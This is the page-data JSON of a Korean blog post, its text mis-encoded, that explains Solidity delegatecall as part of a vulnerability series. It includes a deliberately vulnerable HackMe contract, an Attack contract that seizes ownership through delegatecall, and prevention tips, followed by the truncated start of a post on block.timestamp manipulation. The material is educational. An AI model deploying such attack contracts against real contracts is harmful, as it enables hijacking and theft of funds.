{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/smart_contract/delegate_call/",
    "result": {"data":{"cur":{"id":"e453ebaa-285a-5ed3-b3a7-22d4d4def40d","html":"<h1 id=\"-delegatecall\" style=\"position:relative;\"><a href=\"#-delegatecall\" aria-label=\" delegatecall permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ DelegateCall</h1>\n<h2 id=\"ë“¤ì–´ê°€ê¸°ì „-call-ê³¼-delegate-callì˜-ì°¨ì´ì \" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84-call-%EA%B3%BC-delegate-call%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90\" aria-label=\"ë“¤ì–´ê°€ê¸°ì „ call ê³¼ delegate callì˜ ì°¨ì´ì  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì </h2>\n<h4 id=\"callì´ë€\" style=\"position:relative;\"><a href=\"#call%EC%9D%B4%EB%9E%80\" aria-label=\"callì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Callì´ë€?</h4>\n<p>Callì€ ë‹¤ë¥¸ contractì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•œ low level functionì´ë‹¤.</p>\n<p>ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ Bì˜ í•¨ìˆ˜ í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ë©° msg.sender(í˜¸ì¶œì)ëŠ” ì»¨íŠ¸ë™íŠ¸Aì˜ ì£¼ì†Œê°€ ë©ë‹ˆë‹¤.</p>\n<h4 id=\"delegate-callì´ë€\" style=\"position:relative;\"><a href=\"#delegate-call%EC%9D%B4%EB%9E%80\" aria-label=\"delegate callì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delegate Callì´ë€?</h4>\n<p>delegate callì€ callê³¼ ë§¤ìš° ìœ ì‚¬í•˜ë‹¤. delegateì€ â€˜ìœ„ì„í•˜ë‹¤â€™ ë¼ëŠ” ëœ»ìœ¼ë¡œ callì— ëŒ€í•œ ê¶Œí•œì„ ìœ„ì„í•œë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤.</p>\n<p>Delegate Callì—ëŠ” 2ê°€ì§€ íŠ¹ì§•ì´ ìˆë‹¤.</p>\n<ol>\n<li>í˜¸ì¶œí•œ contractì˜ contextë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë™ì‘ëœë‹¤.</li>\n<li>storage layoutì€ delegatecallì„ ì´ìš©í•˜ëŠ” contractì™€ ê°™ì•„ì•¼í•œë‹¤.</li>\n</ol>\n<p>ì˜ˆë¥¼ ë“¤ì–´ ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ B í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ì§€ ì•Šê³ , Bì˜ ì½”ë“œë¥¼ Aì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤. msg.senderì™€ msg.valueê°€ ì»¨íŠ¸ë™íŠ¸ A í˜¸ì¶œì‹œì™€ ê°™ê³ , ë³€ë™ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p>\n<p>ë§Œì•½ delegate callì— ëŒ€í•´ ë°©ì§€í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ contractì˜ ë‚´ìš©ì„ hackerê°€ ë§ˆìŒëŒ€ë¡œ ì¡°ì¢… í•  ìˆ˜ ìˆê²Œ ë ìˆ˜ë„ ìˆë‹¤. EX) ownerë³€ê²½, ether ê°€ë¡œì±„ê¸° ë“±ë“±</p>\n<hr>\n<h2 id=\"example-code-1\" style=\"position:relative;\"><a href=\"#example-code-1\" aria-label=\"example code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code 1</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Lib</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HackMe</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n    Lib <span class=\"token keyword\">public</span> lib<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>Lib _lib<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n        lib <span class=\"token operator\">=</span> <span class=\"token function\">Lib</span><span class=\"token punctuation\">(</span>_lib<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> hackMe<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _hackMe<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        hackMe <span class=\"token operator\">=</span> _hackMe<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        hackMe<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/delegatecall/\">https://solidity-by-example.org/hacks/delegatecall/</a> </span></p>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>Aê°€ Lib contract ë°°í¬</li>\n<li>Aê°€ Libì˜ addressë¥¼ í¬í•¨í•œ HackMe contract ë°°í¬</li>\n<li><strong>Hacker</strong> ê°€ HackMeì˜ addressë¥¼ í¬í•¨í•œ Attack contract ë°°í¬</li>\n<li><strong>Hacker</strong> ê°€ Attack.attack()ì„ call</li>\n<li>HackMe contractì˜ ownerëŠ” Attack contractê°€ ëœë‹¤.</li>\n</ol>\n<p>ì¢€ ë” ìì„¸íˆ ë“¤ì—¬ë‹¤ë³´ê² ë‹¤.\r\n<strong>Hacker</strong> ê°€ Attack.attackë¥¼ callí•˜ê²Œ ë˜ë©´ HackMe contractì˜ fallback functionì´ ì‹¤í–‰ëœë‹¤. Fallback functionì—ëŠ” libë¥¼ ì“°ê¸° ìœ„í•œ Delegate Callì´ ì¡´ì¬í•œë‹¤. Attack.attackì—ì„œ â€œpwn()â€œì„ ë³´ëƒˆê¸° ë•Œë¬¸ì— Lib contractì˜ pwnì´ ì‹¤í–‰ëœë‹¤.\r\nì´ë•Œ delegate callë¡œ callí•˜ì˜€ê¸° ë•Œë¬¸ì— msg.senderì€ Attack contractê°€ ëœë‹¤. ì´ë ‡ê²Œë˜ë©´ Attack contractê°€ HackMeì˜ ì£¼ì¸ì´ ëœë‹¤.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<ol>\n<li><strong>library</strong> í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œë‹¤.\r\nlibrary í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ statelessí•˜ê³  self destructë¥¼ ë°©ì§€ í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ê°€ëŠ¥í•˜ë‹¤ë©´ stateless ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•œë‹¤.\r\nìœ„ì™€ ë§ˆì°¬ê°€ì§€ë¡œ statelessí•˜ë‹¤ë©´ ë°”ê¿€ stateê°€ ì—†ê¸° ë•Œë¬¸ì— ë” ì•ˆì „í•´ì§ˆ ìˆ˜ ìˆë‹¤.</li>\n</ol>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ë‚˜ì—ê²Œ Delegate callì€ ìƒê°ë³´ë‹¤ ê°œë…ì´ ì–´ë ¤ì› ë‹¤. Example codeì™€ ë‹¤ë¥¸ exampleë“¤ì„ í†µí•´ ì‹¤ìŠµí•˜ë©´ì„œ ê°œë…ì„ ì–»ì„ ê²ƒ ê°™ë‹¤. í•œí¸ìœ¼ë¡œ ì´ê²Œ ì–´ë ¤ìš°ë©´ ë‹¤ë¥¸ê±´ ì–´ì§¸í•˜ëƒ~~ ë¼ëŠ” ìƒê°ì´ë“¤ì§€ë§Œ ê·¸ë•Œë§ˆë‹¤ ì‹¤ìŠµí•˜ì§€ ë­!! ì‹¤ìŠµ ì§±!!</p>\n<hr>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84-call-%EA%B3%BC-delegate-call%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90\">ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì </a></p>\n<ul>\n<li>\n<ul>\n<li><a href=\"#call%EC%9D%B4%EB%9E%80\">Callì´ë€?</a></li>\n<li><a href=\"#delegate-call%EC%9D%B4%EB%9E%80\">Delegate Callì´ë€?</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#example-code-1\">Example Code 1</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n</li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ DelegateCall ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì  Callì´ë€? Callì€ ë‹¤ë¥¸ contractì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•œ low level functionì´ë‹¤. ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ Bì˜ í•¨ìˆ˜ í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ë©° msg.sender(í˜¸ì¶œì)ëŠ” ì»¨íŠ¸ë™íŠ¸Aì˜ ì£¼ì†Œê°€ ë©ë‹ˆë‹¤. Delegate Callì´ë€? delegate callì€ callê³¼ ë§¤ìš° ìœ ì‚¬í•˜ë‹¤. delegateì€ â€˜ìœ„ì„í•˜ë‹¤â€™ ë¼ëŠ” ëœ»ìœ¼ë¡œ callì— ëŒ€í•œ ê¶Œí•œì„ ìœ„ì„í•œë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤. Delegate Callì—ëŠ” 2ê°€ì§€ íŠ¹ì§•ì´ ìˆë‹¤. í˜¸ì¶œí•œ contractì˜ contextë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë™ì‘ëœë‹¤. storage layoutì€ delegatecallì„ ì´ìš©í•˜ëŠ” contractì™€ ê°™ì•„ì•¼í•œë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ B í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ì§€ ì•Šê³ , Bì˜ ì½”ë“œë¥¼ Aì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤. msg.senderì™€ msg.valueê°€ ì»¨íŠ¸ë™íŠ¸ A í˜¸ì¶œì‹œì™€ ê°™â€¦","frontmatter":{"date":"December 26, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 4) Delegate Call","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/smart_contract/delegate_call/"}},"next":{"id":"5f7f9e3c-6802-5000-9596-6c2e78ad5ff6","html":"<h1 id=\"-blocktimestamp\" style=\"position:relative;\"><a href=\"#-blocktimestamp\" aria-label=\" blocktimestamp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ block.timestamp</h1>\n<h2 id=\"blocktimestampë€\" style=\"position:relative;\"><a href=\"#blocktimestamp%EB%9E%80\" aria-label=\"blocktimestampë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>block.timestampë€?</h2>\n<p>block.timestampëŠ” msg.senderì²˜ëŸ¼ ë¸”ë¡ì²´ì¸ì—ì„œ ì œê³µí•´ì£¼ëŠ” global ë³€ìˆ˜ ì¤‘ í•˜ë‚˜ì´ë‹¤. ì´ëŠ” ë¸”ë¡ ìƒì„± ì‹œê°„ì„ ë‚˜íƒ€ë‚¸ë‹¤.\r\në¸”ë¡ì²´ì¸ì˜ timestampëŠ” ìƒì„± ì‹œì ì— ë°ì´í„°ê°€ ì¡´ì¬í–ˆë‹¤ëŠ” ì‚¬ì‹¤ì„ ì¦ëª…í•´ì£¼ê¸° ë•Œë¬¸ì— ë¸”ë¡ì²´ì¸ ìì²´ì— ë§¤ìš° ì¤‘ìš”í•˜ë‹¤.</p>\n<hr>\n<h2 id=\"ì™œ-ì·¨ì•½ì -ì‹œë¦¬ì¦ˆì—-ë“¤ì–´ê°”ì„ê¹Œ\" style=\"position:relative;\"><a href=\"#%EC%99%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88%EC%97%90-%EB%93%A4%EC%96%B4%EA%B0%94%EC%9D%84%EA%B9%8C\" aria-label=\"ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ?</h2>\n<p>ë°”ë¡œ block.timestampëŠ” ì±„êµ´ì(miner)ë“¤ì—ê²Œ ì˜í–¥ì„ ë°›ì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤. ì¦‰ block.timestampë¥¼ í†µí•´ randomì„ ìƒì„±í•˜ê±°ë‚˜ block.timestampì™€ ê´€ë ¨í•´ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ê°€ ìˆë‹¤ë©´ smart contractì—ê²Œ ì¢‹ì§€ ì•Šì€ ì˜í–¥ì„ ë¼ì¹  ìˆ˜ ìˆë‹¤.</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Roulette</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> pastBlockTime<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">spin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// must send 10 ether to play</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">!=</span> pastBlockTime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// only 1 transaction per block</span>\r\n\r\n        pastBlockTime <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">%</span> <span class=\"token number\">15</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/block-timestamp-manipulation/\">https://solidity-by-example.org/hacks/block-timestamp-manipulation/</a></span></p>\n<p>ìœ„ ì½”ë“œë¥¼ ì‹¤í–‰ì‹œì¼œ ë³¼ ìˆ˜ëŠ” ìˆì§€ë§Œ ì‹¤ì œ í•´í‚¹ ì‹¤ìŠµê¹Œì§€ í•´ë³´ëŠ” ê²ƒì€ ì–´ë ¤ìš¸ ê²ƒì´ë¼ê³  ìƒê°í•œë‹¤. ìš°ë¦¬ê°€ minerê°€ ë  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì—ã… ã… </p>\n<p>ìœ„ ì½”ë“œëŠ” ë£°ë«ì„ í†µí•´ etherë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ê²Œì„ì´ë‹¤.\r\n10 etherë¥¼ contract accountì— ë³´ë‚´ê³  ë§Œì•½ timestampê°€ 15ì˜ ë°°ìˆ˜ë¼ë©´ CAì— ìˆëŠ” ëª¨ë“  etherë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤.</p>\n<p>ì˜ˆë¥¼ ë“¤ì–´, CAì— 300 etherê°€ ìŒ“ì—¬ìˆë‹¤ê³  ìƒê°í•´ë³´ì! 2021/12/23 ì‹œì„¸ë¡œ 300 ehterëŠ” 14ì–µì´ ë„˜ëŠ” ëˆì´ë‹¤. ë§Œì•½ minerê°€ timestampë¥¼ ì¡°ì‘í•˜ëŠ”ë° ë“œëŠ” ë¹„ìš©ì´ 14ì–µë³´ë‹¤ ì ê²Œë“ ë‹¤ë©´ ì¡°ì‘ì„ ì‹œë„í•´ë³¼ë§Œ í•˜ë‹¤.</p>\n<hr>\n<h2 